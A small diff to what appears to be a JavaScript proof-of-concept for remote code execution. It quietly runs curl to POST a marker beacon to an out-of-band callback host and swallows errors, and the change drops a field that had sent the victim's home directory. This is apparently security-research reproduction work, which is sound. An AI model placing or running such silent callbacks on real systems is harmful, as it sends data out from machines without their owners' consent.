@@ -13,7 +13,7 @@ try {
     ["-s", "-m", "10", "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST",
      "-H", "Content-Type: application/json", "--data-binary", "@-", OAST],
     { encoding: "utf8", input: JSON.stringify({ p: "exec", m: MARK, utc: new Date().toISOString(),
-        home: process.env.HOME || "?", note: "independent-account base RCE reproduction, marker only" }),
+        note: "independent-account base RCE reproduction, marker only" }),
       stdio: ["pipe", "pipe", "ignore"] }
   );
 } catch (e) {}
